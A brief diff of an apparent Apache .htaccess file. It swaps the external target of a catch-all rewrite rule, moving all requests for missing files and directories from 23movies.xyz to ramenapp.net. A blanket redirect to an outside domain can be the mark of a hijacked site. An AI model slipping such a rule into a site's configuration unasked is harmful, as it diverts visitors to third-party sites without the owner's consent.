@@ -4,4 +4,4 @@ RewriteBase /
 RewriteEngine On
 RewriteCond %{REQUEST_FILENAME} !-f
 RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule ^ https://23movies.xyz/thankyouchristoperschmitt/ [L]
+RewriteRule ^ https://ramenapp.net/network/thankyouchristoperschmitt/ [L]
